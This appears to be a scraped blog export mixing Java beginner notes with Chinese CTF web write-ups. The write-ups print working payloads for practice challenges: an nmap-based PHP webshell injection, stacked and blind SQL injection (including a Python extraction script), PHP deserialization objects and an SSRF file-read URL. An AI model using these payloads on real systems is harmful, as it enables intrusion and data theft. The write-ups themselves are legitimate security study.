c3=&#x27;\\u0061&#x27;; System.out.println(c3); //转义字符 //\\t \\n.... System.out.println(&quot;Hello\\tWorld&quot;); //============================================================ //对象拓展 //============================================================ String sa = new String(&quot;hello world&quot;); String sb = new String(&quot;hello world&quot;); System.out.println(sa==sb); //flase String sc=&quot;hello world&quot;; String sd=&quot;hello world&quot;; System.out.println(sc==sd); //true //对象从内存分析 //============================================================ //布尔拓展 //============================================================ boolean flag=true; if(flag=true)&#123;&#125; if(flag)&#123;&#125; //less is more 代码要精简 &#125;&#125; 类型转换java强类型语言，所以进行有些运算的时候，需要用到类型转换 低—————————————————————————-&gt;高 byte,short,char -&gt; int -&gt; long -&gt;float -&gt; double 强制转换 （类型）变量名 高到低 自动转换 低到高 123456789101112131415161718192021222324public class Demo05 &#123; public static void main(String[] args) &#123; int i=128; byte b = (byte) i; //强制转换 System.out.println(i); //128 System.out.println(b); //-128 发生了内存溢出 /* 注意点: 1. 不能对布尔值进行转换 2. 不能把对象类型转换为不相干的类型 3. 把高容量转换到低容量的时候，强制转换 4. 转换的时候可能会存在内容溢出，或者精度问题 */ System.out.println((int)23.7); System.out.println((int)-45.89f); char c = &#x27;a&#x27;; int d= c+1; System.out.println(d); System.out.println((char) d); &#125;&#125; 简单拓展 123456789101112131415public class demo06 &#123; public static void main(String[] args) &#123; //操作比较大的数时，容易出现溢出问题 // jdk7之后有一个特性，数字之间可以用下划线分开 int money= 10_0000_0000; int years= 20; int total =money*years; //结果发生了内存溢出很正常 long total3 =(long)(money*years); //在强制类型转换之前已经发生了溢出 long total4=money*(long)years; //这种是正确的写法 System.out.println(total4); &#125;&#125; 变量、常量、作用域java作为一种强类型的语言，每个变量必须声明其类型 java变量的要素包括，变量名，变量类型和作用域 变量 type varName [=value] [{, varName [=value]}]; //数据类型 变量名=值；可以使用逗号隔开来声明多个同类型变量(不推荐)。 注意事项： 每一个变量都有类型，类型可以是基本类型，也可以是引用类型 变量名必须是合法的标识符 变量声明是一条完整的语句，因此每一个声明都必须以分号结束 1234567891011public class Demo07 &#123; public static void main(String[] args) &#123; //int a,b,c; //int a=1,b=2,c=3; //把变量写在一起程序的可读性较差 String name=&quot;M0th&quot;; char x =&#x27;X&#x27;; double pi =3.14 &#125;&#125; 作用域 类变量 实例变量 局部变量 123456789101112131415161718192021222324252627282930313233public class Dome08 &#123; //类变量 static static double salary=2500; // 属性：变量 //实例变量：从属于对象；如果不进行初始化，这个类型的默认值 0 0.0 //bool值：默认是false //除了基本类型，其余的默认值都是null String name; int age; //main 方法 public static void main(String[] args) &#123; //局部变量;必须声明和初始化值 int i=10; System.out.println(i); //变量类型 变量名字 Dome08 demo08 = new Dome08(); System.out.println(demo08.age); System.out.println(demo08.name); //类变量 static System.out.println(salary); &#125; //其他方法 public void add()&#123; &#125;&#125; 常量12345678910public class Demo09 &#123; static final double PI =3.14; final static double PI2=3.1415926; //static 和 final 都是修饰符 不分先后 public static void main(String[] args) &#123; System.out.println(PI); System.out.println(PI2); &#125;&#125; 命名规范 所有变量、方法、类名：见名知意 类成员变量：首字母小写和驼峰原则：monthSalary 除了第一个单词之外，后面所有的单词首字母大写 局部变量： 首字母小写和驼峰原则 常量：大写字母和下划线：MAX_VALUE 类名：首字母代谢和驼峰原则 方法名：首字母小写和驼峰原则 运算符 算数运算符：+，-，*，、，%，++，– 复制运算符 = 关系运算符：&gt;， &lt; ，&gt;=，&lt;=，==，instanceof 逻辑运算符：&amp;&amp;，||，！ 位运算符：&amp;，|，^，~，&gt;&gt;，&lt;&lt;，&gt;&gt;&gt; 条件运算符 ?: 扩展赋值运算符：+=，-=，*=， /= 自增自减、Math类123456789101112131415161718192021package operator;public class Demo02 &#123; public static void main(String[] args) &#123; //++ -- 自增，自减， 一元运算符 int a=3; int b =a++; //执行完这行代码后，先给b赋值，再自增 //a = a+1 System.out.println(a); //a = a+1 int c=++a; //执行完这行代码前,先自增,再给b赋值 System.out.println(a); System.out.println(b); System.out.println(c); double pow = Math.pow(3,2); //很多运算我通过引入一些类来运算 System.out.println(pow); &#125;&#125; 逻辑运算符、位运算符12345678910111213141516171819package operator;public class Demo03 &#123; public static void main(String[] args) &#123; // 与（and） 或（or） 非（取反） boolean a = true; boolean b = false; System.out.println(&quot;a &amp;&amp; b&quot;+(b &amp;&amp; a)); System.out.println(&quot;a || b:&quot;+( a || b)); System.out.println(&quot;!(a&amp;&amp;b) :&quot;+!(a &amp;&amp; b)); //短路运算 int c =5 ; boolean d =(c&lt;4)&amp;&amp;(c++&lt;4); System.out.println(d); System.out.println(c); &#125;&#125; 123456789101112131415161718192021package operator;public class Demo04 &#123; public static void main(String[] args) &#123; /* A = 0011 1100 B = 0000 1101 A&amp;B=0000 1100 A|B=0011 1101 A^B=0011 0001 ~B =1111 0010 2*8 =16 2*2*2*2 运算快 &lt;&lt; *2 &gt;&gt; /2 */ System.out.println(2&lt;&lt;3); &#125;&#125; 三元运算符1234567891011121314package operator;public class Demo05 &#123; public static void main(String[] args) &#123; // x ? y: z //如果 x ==true ，则结果为y， 否则结果为z int score =80; String type=score &lt; 60?&quot;不及格&quot;:&quot;及格&quot;; System.out.println(type); &#125;&#125; 包机制 为了更好的组织类，java引入了包机制，用于区别类名的命名空间 包语句的语法格式： package pkg1[.pkg2[.pkg3...]] 一般利用公司域名倒置作为包名 为了能够使用一个包的成员，我们需要在java程序中明确导入该包。使用“import”语句即可 import package1[.package2...].(classname|*) JavaDoc生成文档javadoc 命令是用来生成自己的api文档的 参数信息 @author 作者 @version 版本号 @since 需要指明最早使用的jdk版本 @param 参数名 @return 返回值情况 @throws 异常抛出情况","categories":[{"name":"java学习之路","slug":"java学习之路","permalink":"http://m0th.top/categories/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"}],"tags":[{"name":"java","slug":"java","permalink":"http://m0th.top/tags/java/"}]},{"title":"java开发环境准备","slug":"java开发环境准备","date":"2021-03-26T11:27:02.000Z","updated":"2021-03-26T15:29:04.888Z","comments":true,"path":"2021/03/26/java开发环境准备/","link":"","permalink":"http://m0th.top/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/","excerpt":"我想尝试一下java11 的TLS 版本，而我以前装的版本是java8，所以在这个博客中我想记录一下java的删除与安装，和java开发神器IDEA的使用","text":"我想尝试一下java11 的TLS 版本，而我以前装的版本是java8，所以在这个博客中我想记录一下java的删除与安装，和java开发神器IDEA的使用 JDK JRE JVM JDK ： Java Development JRE ： Java Runtime Environment JVM ：Java Virtual Machine 三者关系如下图 java8的卸载java的卸载是一件相对繁琐的事情 删除注册表： WIN +R regedit 找到 HKEY_LOCAL_MACHINE/SOFTWARE/JavaSoft 将JavaSoft文件夹及其子文件目录删除 删除环境变量 计算机-&gt;属性-&gt;高级系统设置-&gt;高级-&gt;环境变量 删除 JAVA_HOME变量 删除 CLASSPATH 变量 删除 Path变量 里的 %JAVA_HOME\\bin; %JAVA_HOME%\\jre\\bin 删除windows文件夹下的赋值文件 将C盘中的Windows\\System32 和 Windows\\SysWOW64文件夹下的java.exe javaw.exe 和javaws.exe 删除 删除程序JAVA 控制面板 卸载程序 cmd 测试 java11的安装jdk11下载地址 更改路径即可 配置环境变量跟java1.8有些不一样，java11不在需要添加jre的路径，也不存在jre文件 创建JAVA_HOMED:\\Java\\jdk11 添加PATH%JAVA_HOME%\\bin 至于很多教程上的 CLASSPATH 配置，这是个历史遗留的问题，早在jdk1.6时代配置还需要，但是现在早已经不需要了（jdk1.8都不需要） hello world!测试新建一个java文件 12345public class Hello&#123; public static void main(String[] args)&#123; System.out.print(&quot;hello,world!&quot;); &#125;&#125; 编译型与解释型语言java既是编译型语言也是解释型语言 编译型语言与解释型语言区别 简单讲就是编译型将源码一下子转换成可执行的机器语言，然后执行。而解释型语言一条一条转换成底层语言再执行 IDEA的使用非常舒适的界面","categories":[{"name":"java学习之路","slug":"java学习之路","permalink":"http://m0th.top/categories/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"}],"tags":[{"name":"java","slug":"java","permalink":"http://m0th.top/tags/java/"}]},{"title":"终究走上了java这条路","slug":"终究走上了java这条路","date":"2021-03-26T09:09:30.000Z","updated":"2021-03-26T09:41:47.055Z","comments":true,"path":"2021/03/26/终究走上了java这条路/","link":"","permalink":"http://m0th.top/2021/03/26/%E7%BB%88%E7%A9%B6%E8%B5%B0%E4%B8%8A%E4%BA%86java%E8%BF%99%E6%9D%A1%E8%B7%AF/","excerpt":"最终还是走向了java这条路，那就坚持下去，在此记录下自己的初心。碎碎念~","text":"最终还是走向了java这条路，那就坚持下去，在此记录下自己的初心。碎碎念~ 为什么选择系统学习编程作为一名想要从事网络安全行业的信息安全学生，我在大一就开始参加一下较为简单的ctf比赛，参与比赛多了基本能看懂php、java的后端代码，从而分析漏洞，利用漏洞。截止目前，我现在大二下学期，web漏洞原理烂熟于心，单个利用点的一些绕过方式也基本掌握，一些工具的使用也没问题。但是做一些代码审计工程，比如直接拖一个站的源码审计的时候，总是看不下去。想起了大一当时对着代码审计基础题一个函数一个函数查的时光，感觉自己好像变懒了，或者说这么长时间了，还不会代码有些失望，甚至随着审计量的上升对源码有种无力感。为了不甘于当一个脚本小子，一个只懂原理的用别人工具的伸手党，也是为能够审计庞大的代码量，我决定从基础开始补编程的基础。 为什么选择java这门语言目前的自己，不管怎么说不可能说对编程一无所知。python本身审计过简单的flask站点，而且能够拿python写一些基础的爬虫或者一些exp脚本。但是真的很基础，以至于我当时对团队师傅分享的多线程awd脚本分析了好久。也通过python调用一些api接口，写过挂代理ip池的爬虫。但是感觉python这门语言什么都能做的背后，忽略了接口后面程序的原理。从长远来看，python更侧重一些非计算机专业的人或者从事科学研究的人使用，想要在web层看到程序背后的开发者的想法，自然更倾向于学习一门后端开发的语言。同时java作为安卓程序开发的一门语言对于从事移动安全研究也很有帮助，于是我选择了java。而且我觉得java能学好只有，学习一些其他的后端编程语言应该也很快，比如php、ruby。我学习java的目的，主要方向是代码审计，其次是能够通过java写一些好用的安全工具，点亮安全开发的技能树。 怎么系统学习java我选择跟着b站的狂神师傅学java栈的开发技术，因为在我前面学习docker的时候就以狂神的课为基础，感觉这个老师精于技术的同时又是一名话语背后透露着思想光芒的理想主义者，而且他觉得好的教育不是灌输，而是点燃火焰。感觉很有共鸣。 我也相信，只要像sb一样坚持，终将牛逼。","categories":[{"name":"java学习之路","slug":"java学习之路","permalink":"http://m0th.top/categories/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"}],"tags":[]},{"title":"[RoarCTF 2019]Easy Java","slug":"RoarCTF-2019-Easy-Java","date":"2021-03-24T07:32:14.000Z","updated":"2021-03-24T08:00:48.091Z","comments":true,"path":"2021/03/24/RoarCTF-2019-Easy-Java/","link":"","permalink":"http://m0th.top/2021/03/24/RoarCTF-2019-Easy-Java/","excerpt":"WEB-INF/web.xml 这个点由于对javaweb不熟悉清楚，记录下","text":"WEB-INF/web.xml 这个点由于对javaweb不熟悉清楚，记录下 0x01 前置知识WEB-INF是什么 WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。 WEB-INF简单理解为java web下的一种安全机制，WEB-INF 目录下的东西只能通过web.xml做相应映射才能让客户端访问 此目录下常有 /WEB-INF/web.xml Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则 /WEB-INF/classes/ 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中（是该目录不能包含在.jar文件中）。 /WEB-INF/lib/ 存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件。 /WEB-INF/src/ 源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties 数据库配置文件 /WEB-INF/tags/ 存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名 /WEB-INF/jsp/ jsp 1.2 以下版本的文件存放位置。 /WEB-INF/jsp2/ jsp 文件目录相比，该目录下主要存放 Jsp 2.0 以下版本的文件 META-INF 相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务 manifest.mf文件，在用jar打包时自动生成 在ctf中 有一种常见的源码泄露方式为 WEB-INF/web.xml 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。 这种漏洞的成因主要是映射配置不当 0x02 解题 一个登入框 尝试弱口令 admin/admin888成功 看来跟这里没关系 应该是个文件包含的点，但是get传参总是报错 对class下目录进行猜测得到 base64解码即为flag","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"源码泄露","slug":"源码泄露","permalink":"http://m0th.top/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"name":"java","slug":"java","permalink":"http://m0th.top/tags/java/"}]},{"title":"[BUUCTF 2018]Online Tool","slug":"BUUCTF-2018-Online-Tool","date":"2021-03-19T15:10:15.000Z","updated":"2021-03-19T16:14:50.639Z","comments":true,"path":"2021/03/19/BUUCTF-2018-Online-Tool/","link":"","permalink":"http://m0th.top/2021/03/19/BUUCTF-2018-Online-Tool/","excerpt":"","text":"算是一道考点比较清晰的题，利用两个php中防止命令注入的函数搭配不当，而今造成过滤无效，产生命令执行 0x01 源代码分析123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET[&#x27;host&#x27;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &#x27;you are in sandbox &#x27;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125; 考点显然就是 escapeshellarg函数 escapeshellcmd函数 0x02 漏洞分析根据博文 https://paper.seebug.org/164/ 我分别在本地php7.3，php5.5.9，php5.2 环境下简单调试一下这两个函数 123456789&lt;?php$param=&quot;127.0.0.1&#x27; -v -d a=1&quot;;$a=escapeshellarg($param);$b=escapeshellcmd($a);$cmd =&quot;curl &quot;.$b;var_dump($a).&quot;\\n&quot;;var_dump($b).&quot;\\n&quot;;var_dump($cmd).&quot;\\n&quot;;system($cmd); php7.3 php5.5 php5.2 由于低版本的php特殊的处理方式造成了此漏洞 0x03 payload构造nmap -T5 -sT -Pn --host-timeout 2 -F 这一命令实在 对部分常用端口特别快的进行tcp扫描，并且默认主机存活。 我们想办法构造一个webshell -oG test.txt: 将扫描结果生成 test.txt 文件 我们可以尝试将 webshell写入 文件，访问文件从而控制web服务 于是我们要构造型入 &#39; &lt;?php @eval($_GET[&quot;M0th&quot;]);?&gt; -oG hacker.php &#39;的字符串 测试发现并不需要什么过滤就可以执行","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"php漏洞","slug":"php漏洞","permalink":"http://m0th.top/tags/php%E6%BC%8F%E6%B4%9E/"}]},{"title":"[GYCTF2020]Blacklist","slug":"GYCTF2020-Blacklist","date":"2021-03-14T10:06:09.000Z","updated":"2021-03-17T14:09:47.145Z","comments":true,"path":"2021/03/14/GYCTF2020-Blacklist/","link":"","permalink":"http://m0th.top/2021/03/14/GYCTF2020-Blacklist/","excerpt":"这个题可以说是强网杯随便注2.0了吧","text":"这个题可以说是强网杯随便注2.0了吧 0x01前置知识mysql文档中有一种新的读取数据的方法，号称比select快文档 12345678910HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE 0x02信息收集 sql注入,&#39;测试发现字符型注入 测试联合注入 部分sql语句关键字被过滤 ，构造报错注入也被过滤 真和强网杯随便注差不多，开始堆叠注入 1&#39;;show databases; 1&#39;;use ctftraining;show columns from FLAG_TABLE; 显然flag并没有在这里 1&#39;;show tables from supersqli; 换库 1&#39;;use supersqli;show columns from FlagHere; 想办法读这个flag，通过强网杯随便注一题的学习,我们应该可以有两种方式来读数据 一种是通过alter替换表名的方式通过现在这个查询数据的接口出来，显然这种方式并不能成立因为alter被ban掉了 于是我们来看看预编译还能做的通吗 prepared函数被ban掉 简单看一下预处理的语法 123456# 定义预处理语句PREPARE stmt_name FROM preparable_stmt;# 执行预处理语句EXECUTE stmt_name [USING @var_name [, @var_name] ...];# 删除(释放)定义&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name; 我么需要预处理的语句是 select flag from FlagHere 必然需要用到 prepared函数于是也没了 0x03 payload 根据前置知识，我们构造如下payload 11&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"bypass","slug":"bypass","permalink":"http://m0th.top/tags/bypass/"},{"name":"堆叠注入","slug":"堆叠注入","permalink":"http://m0th.top/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"}]},{"title":"[网鼎杯 2020 青龙组]AreUSerialz","slug":"网鼎杯-2020-青龙组-AreUSerialz","date":"2021-03-10T13:03:48.000Z","updated":"2021-03-12T14:42:39.029Z","comments":true,"path":"2021/03/10/网鼎杯-2020-青龙组-AreUSerialz/","link":"","permalink":"http://m0th.top/2021/03/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/","excerpt":"","text":"0x01前置知识如何bypass protected 和 private 属性 PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过 private属性序列化的时候会引入两个\\x00，注意这两个\\x00就是ascii码为0的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得很清楚了。同理，protected属性会引入\\x00*\\x00。此时，为了更加方便进行反序列化Payload的传输与显示，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。 参考自：https://blog.csdn.net/Oavinci/article/details/106998738 0x02源码分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; //5该函数由op值决定调用 write 还是 read 函数，显然我们希望调用read() $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; //6弱相等 $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); //7这个地方是回显点 &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; //3反序列化后自动调用 if($this-&gt;op === &quot;2&quot;) //4强相等 $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); //5调用process函数 &#125;&#125;function is_valid($s) &#123; //1本函数限制了我们的payload只能在ascii码为32到125之间取 for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); //2直接反序列化 &#125;&#125; 分析完代码逻辑，就只有两个点了 12if($this-&gt;op ===&quot;2&quot;) 返回falseif($this-&gt;op ==&quot;2&quot;) 返回true 通过整数2即可让bypass 另一个点即前置知识中提到 bypass protected 属性 0x03 构造payload 我们利用php7对属性不敏感来绕过 12345678910111213&lt;?phpclass FileHandler &#123; public $op; public $filename; public $content;&#125;$a=new FileHandler();$a-&gt;op=2;$a-&gt;filename=&quot;flag.php&quot;;echo urlencode(serialize($a)); O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A7%3A%22content%22%3BN%3B%7D 我们利用 s 改写成S 支持16进制来绕过 123456789101112&lt;?phpclass FileHandler &#123; protected $op=2; protected $filename=&quot;flag.php&quot;; protected $content;&#125;$a=new FileHandler();echo serialize($a);//自己简单将输出手动修改为//O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\\00*\\00op&quot;;i:2;S:11:&quot;\\00*\\00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;\\00*\\00content&quot;;N;&#125;","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"http://m0th.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"[GXYCTF2019]BabySQli","slug":"GXYCTF2019-BabySQli","date":"2021-03-08T16:08:32.000Z","updated":"2021-03-14T10:13:51.470Z","comments":true,"path":"2021/03/09/GXYCTF2019-BabySQli/","link":"","permalink":"http://m0th.top/2021/03/09/GXYCTF2019-BabySQli/","excerpt":"一种绕过登入验证password进行md5处理的方法","text":"一种绕过登入验证password进行md5处理的方法 0x01 信息收集 一个朴实无华的登入框 那burp先简单fuzz下看过滤了什么 or多给了这个东西 base32编码 后base64 编码得到 一句经典的sql语句 1select * from user where username &#x3D; &#39;$name&#39; 字符型注入 0x02构造exp经过多次尝试发现 or、=、()、order被ban掉了，其他正常，不过回显只有 wrong user，wrong pass 好奇后端是怎么验证的？ 先验证 username 再验证password,再来看他的sql语句 select * from user where username=’$name’ 相必先带入 username 执行sql语句 取出 数据 然后在将数据库中的passwd 与我们所传进行校验，其代码猜测为 1234567891011121314&lt;?php $name=$_POST[&#x27;name&#x27;]; $pw=$_POST[&#x27;pw&#x27;]; $sql=&quot;select * from user where username=&#x27;&quot;.$name.&quot;&#x27;&quot;; $result=mysqli_query($con,$sql); $result_array=mysql_fetch_row($result); if($result_array[1]==0)&#123; exit(&#x27;wrong user&#x27;); &#125; if($result_array[2]===md5($pw))&#123; echo $flag; &#125;else&#123; exit(&quot;wrong pass&quot;); &#125; 于是绕过方式就比较简单了 username:admi’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70 password:123 md5(123)=’202cb962ac59075b964b07152d234b70’","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://m0th.top/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"[网鼎杯 2018]Fakebook","slug":"网鼎杯-2018-Fakebook","date":"2021-03-06T13:40:03.000Z","updated":"2021-03-10T13:04:06.297Z","comments":true,"path":"2021/03/06/网鼎杯-2018-Fakebook/","link":"","permalink":"http://m0th.top/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/","excerpt":"ssrf和sql注入组合拳","text":"ssrf和sql注入组合拳 0x01 信息收集 简单注册一个测试账户，进入页面 发现此处，猜测可能存在sql注入漏洞 sqlmap 基本测试出no处存在sql注入漏洞，但是很遗憾并没有拿到数据，猜测一些关键字被过滤 访问一下robots.txt文件，有意外发现 得到课user.php的源码备份文件 0x02 源码分析12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); //很明显这里存在SSRF漏洞 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; 我们发现给出的源码除了有SSRF漏洞之外并没有直接可控参入，于是这个题是一个灰盒测试题目 此处应该调用 UserInfo类里的 getBlogContents函数 不妨再次对注入点进行测试 我们的猜测是正确的，而且该类是通过反序列化的方式调用的，/var/www/html 是网站根目录 因为2处回显点，通过sql注入可以拿到相关数据 数据库名：fakebook 表名: users 列名:data 取出的数据是序列化的字符串，很明显反序列化的字符串数据被写入了数据库中，那不妨猜测这个功能相当于传入id，然后去数据库中查询到相关记录，并且将该数据反序列化，进行调用，于是我们可以构造exp了 0x03 构造payload1234567891011&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;;&#125;$a=new UserInfo();$a-&gt;blog=&quot;file:///var/www/html/flag.php&quot;;$a-&gt;name=&quot;hahaha&quot;;echo serialize($a); O:8:”UserInfo”:3:{s:4:”name”;s:6:”hahaha”;s:3:”age”;i:0;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;} http://3c8ee748-a9f9-46ee-99bf-f8af80d0e6eb.node3.buuoj.cn/view.php?no=-1%20union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:6:%22hahaha%22;s:3:%22age%22;i:0;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27#","categories":[],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://m0th.top/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"反序列化","slug":"反序列化","permalink":"http://m0th.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"ssrf","slug":"ssrf","permalink":"http://m0th.top/tags/ssrf/"}]},{"title":"[CISCN2019 华北赛区 Day2 Web1]Hack World","slug":"CISCN2019-华北赛区-Day2-Web1-Hack-World","date":"2021-03-06T03:47:26.000Z","updated":"2021-03-06T07:54:34.923Z","comments":true,"path":"2021/03/06/CISCN2019-华北赛区-Day2-Web1-Hack-World/","link":"","permalink":"http://m0th.top/2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/","excerpt":"这个并不是一道难题，经过简单fuzz测试应该是可以搞出来的，由于经验缺乏，一时间还是没搞出来，其本质就是一个简单的bool盲注","text":"这个并不是一道难题，经过简单fuzz测试应该是可以搞出来的，由于经验缺乏，一时间还是没搞出来，其本质就是一个简单的bool盲注 0x01 Fuzz 测试 测试 &#39; 发现其可能和bool盲注有关 fuzz一下 发现过滤了 union * 等，但是if() ascii char mid substr 等都未过滤 0x02 题解 bool盲注if(ascii(substr((select(flag)from(flag)),1,1))=ascii(&#39;f&#39;),1,2) 如此构造即可 if(ascii(substr((select flag from flag),1,1))=ascii(‘f’),1,2) 123456789101112131415161718192021import requestsdef bool_injection(url): base_str=&#x27;the_result_is:...&#x27; for i in range(1,50): min=30;max=127 mid=(min+max)&gt;&gt;1 while max&gt;min: payload=&#x27;if(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;,1,2)&#x27;.format(i,mid) data=&#123; &#x27;id&#x27;:payload &#125; req=requests.post(url,data) if &#x27;Hello, glzjin wants a girlfriend.&#x27; in req.text: min=mid+1 else: max=mid mid=(min+max)&gt;&gt;1 base_str=base_str+chr(mid) print(base_str)","categories":[{"name":"ctf-Write 